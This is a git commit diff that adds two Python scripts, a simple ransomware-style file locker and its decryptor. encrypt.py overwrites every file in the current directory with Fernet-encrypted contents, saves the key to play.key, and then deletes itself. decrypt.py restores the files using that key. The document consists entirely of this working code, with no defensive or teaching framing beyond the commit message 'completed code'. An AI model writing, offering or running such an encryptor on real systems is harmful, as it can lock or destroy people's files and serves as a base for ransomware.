7775a7bd57629bfc49f5427606d003a8630166dd
Arbaaz Khan <arbaaz.afraaz@gmail.com>
2022-12-02 18:37:28 +1100

    completed code

---
+++ decrypt.py
@@ -0,0 +1,18 @@
+import os
+from cryptography.fernet import Fernet
+
+files = []
+
+for file in os.listdir():
+    if os.path.isfile(file) and file != "encrypt.py" and file != "play.key" and file != "decrypt.py":
+        files.append(file)
+
+with open("play.key", "rb") as key_file:
+    key = key_file.read()
+
+for file in files:
+    with open(file, "rb") as decryption_file:
+        contents = decryption_file.read()
+    decrypted_contents = Fernet(key).decrypt(contents)
+    with open(file, "wb") as decryption_file:
+        decryption_file.write(decrypted_contents)
---
+++ encrypt.py
@@ -0,0 +1,24 @@
+import os
+from sys import argv
+from cryptography.fernet import Fernet
+
+files = []
+
+for file in os.listdir():
+    if os.path.isfile(file) and file != "encrypt.py" and file != "play.key" and file != "decrypt.py":
+        files.append(file)
+
+key = Fernet.generate_key()
+
+with open("play.key", "wb") as key_file:
+    key_file.write(key)
+
+for file in files:
+    with open(file, "rb") as encryption_file:
+        contents = encryption_file.read()
+    encrypted_contents = Fernet(key).encrypt(contents)
+    with open(file, "wb") as encryption_file:
+        encryption_file.write(encrypted_contents)
+
+
+os.remove(argv[0])
